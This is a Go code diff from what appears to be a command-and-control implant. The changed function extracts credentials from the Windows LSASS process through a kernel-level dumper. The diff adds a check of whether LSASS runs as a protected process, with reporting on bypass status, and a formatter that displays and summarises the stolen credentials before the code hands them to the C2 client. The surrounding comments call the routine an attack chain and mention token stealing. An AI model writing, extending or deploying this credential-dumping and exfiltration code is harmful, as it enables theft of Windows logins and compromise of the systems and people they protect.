@@ -723,7 +723,16 @@ func runC2Mode(cfg *config.Config, dumper *lsass.KernelLsassDumper, log *logger.
 func handleCredentialExtraction(taskID string, dumper *lsass.KernelLsassDumper, c2 *c2client.C2Client, log *logger.Logger) {
 	log.Infof("=== C2 TASK %s: COMPREHENSIVE ATTACK CHAIN ===", taskID)
 
-	// LSASS CREDENTIAL EXTRACTION (Token stealing already done globally)
+	// Check PPL status first
+	pplDetector := lsass.NewPPLDetector(log)
+	isProtected, status, err := pplDetector.IsLSASSProtected(dumper.GetLsassPID())
+	if err != nil {
+		log.Warnf("PPL detection failed: %v", err)
+	} else {
+		pplDetector.ReportBypassStatus(isProtected, status)
+	}
+
+	// LSASS CREDENTIAL EXTRACTION
 	log.Infof("Phase 2: Executing LSASS extraction for task: %s", taskID)
 	if dumper == nil {
 		log.Errorf("KernelLsassDumper not available for task %s", taskID)
@@ -740,6 +749,11 @@ func handleCredentialExtraction(taskID string, dumper *lsass.KernelLsassDumper, 
 	}
 
 	log.Infof("Successfully extracted %d credentials for task %s", len(credentials), taskID)
+
+	// Format and display credentials
+	formatter := lsass.NewCredentialFormatter(log)
+	formatter.FormatAndDisplay(credentials)
+	formatter.SummarizeCredentials(credentials)
 
 	// Convert to C2 format and send.
 	c2Creds := make([]lsass.LSASSCredentials, len(credentials))
